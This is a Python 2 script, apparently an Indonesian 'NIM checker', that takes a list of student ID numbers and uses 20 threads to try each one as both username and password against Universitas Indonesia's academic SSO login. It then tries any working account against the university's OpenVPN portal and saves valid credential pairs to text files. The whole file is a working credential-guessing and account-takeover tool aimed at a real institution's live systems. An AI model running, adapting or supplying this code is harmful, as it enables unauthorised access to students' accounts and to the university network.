import requests,sys, json, os
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup
#warna
red = '\33[31;1m'
white = '\33[37;1m'
green= '\33[32;1m'
cyan='\33[0;36m'
#main checker
def banner():
  os.system('clear')
  print '''
  __
<(o )___ ~Ui nim checker~
 ( ._> /  Author : Dann
  `---'   Gunakan dengan bijak!
  '''
def main(nim):
  try:
    data = {'u':nim,'p':nim}
    s = requests.Session()
    req = s.post('https://academic.ui.ac.id/main/Authentication/Index',data=data)
    if 'Login Failed' in req.text:
      print '%s[%s!%s] %sLogin gagal%s ~> %s%s%s:%s%s%s'%(white,red,white,red,white,red,nim,white,red,nim,white)
    else:
      usr = s.get('https://academic.ui.ac.id/').text
      scrap = BeautifulSoup(usr, 'html.parser')
      data_user = scrap.find_all('div', {'class': 'infocol'})
      for u in data_user:
        user = u.find('dd').string
        s = requests.Session()
        host = 'https://openvpn.cs.ui.ac.id/csauth/login/'
        ref = s.get(host)
        csrf_token = ref.cookies['csrftoken']
        res = s.post(host,data={'csrfmiddlewaretoken': csrf_token,'username':user,'password':nim},headers=dict(Referer=host)).text
        if 'Username atau password salah' in res:
          print '%s[%s!%s] %sLogin berhasil sso only%s ~> %s%s%s:%s%s%s'%(white,red,white,green,white,green,user,white,green,nim,white)
          sv2 = open('live-ui-sso.txt','a')
          sv2.write('%s:%s\n'%(user,nim))
          sv2.close()
        else:
          print '%s[%s!%s] %sLogin berhasil sso&openvpn%s ~> %s%s%s:%s%s%s'%(white,green,white,green,white,green,user,white,green,nim,white)
          sv = open('live-ui-sso_ovpn.txt','a')
          sv.write('%s:%s\n'%(user,nim))
          sv.close()
  except Exception as e:
    print e
if __name__=='__main__':
  try:
    banner()
    list = raw_input('root@natch:~# List : ')
    list_nim = open(list,'r').read().splitlines()
    total = open(list, 'r').readlines()
    print '    [%sINFO%s] Total %s%s%s nim di %s%s%s'%(green,white,red,str(len(total)),white,red,list,white)
    print '\n[%sINFO%s] File Tersimpan di, %slive-ui-sso_ovpn.txt | live-ui-sso.txt%s'%(red,white,green,white)
    pool = ThreadPool(20)
    pool.map_async(main,list_nim).get(9999999)
  except KeyboardInterrupt:
    print '\n[%s!%s] %sKeyboardInterrupt, Exiting....%s'%(red,white,red,white)
    print '\n[%sINFO%s] File Tersimpan di, %slive-ui-sso_ovpn.txt | live-ui-sso.txt%s'%(red,white,green,white)
  except Exception as e:
    print e